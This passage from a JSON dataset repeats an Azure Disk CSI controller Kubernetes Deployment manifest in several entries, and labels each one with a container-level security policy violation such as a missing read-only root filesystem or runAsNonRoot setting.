mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-attacher\" does not have a read-only root file system"
  },
  {
    "id": "01145",
    "manifest_path": "data/manifests/the_stack_sample/sample_0307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-provisioner\" does not have a read-only root file system"
  },
  {
    "id": "01146",
    "manifest_path": "data/manifests/the_stack_sample/sample_0307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-resizer\" does not have a read-only root file system"
  },
  {
    "id": "01147",
    "manifest_path": "data/manifests/the_stack_sample/sample_0307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-snapshotter\" does not have a read-only root file system"
  },
  {
    "id": "01148",
    "manifest_path": "data/manifests/the_stack_sample/sample_0307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"liveness-probe\" does not have a read-only root file system"
  },
  {
    "id": "01149",
    "manifest_path": "data/manifests/the_stack_sample/sample_0307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"azuredisk\" is not set to runAsNonRoot"
  },
  {
    "id": "01150",
    "manifest_path": "data/manifests/the_stack_sample/sample_0307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-attacher\" is not set to runAsNonRoot"
  },
  {
    "id": "01151",
    "manifest_path": "data/manifests/the_stack_sample/sample_0307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        